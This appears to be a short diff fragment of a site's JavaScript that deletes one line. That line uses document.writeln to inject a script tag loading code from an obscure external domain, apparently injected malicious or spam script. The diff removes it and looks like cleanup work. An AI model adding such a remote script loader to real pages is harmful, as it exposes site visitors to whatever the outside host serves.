@@ -29,5 +29,4 @@ if (webUser) {
 			}
 		}
 	}
-	document.writeln('<script src="https://js.0223vq88m.cc/slot?7255774253627174051-10290"><\/script>')
 }
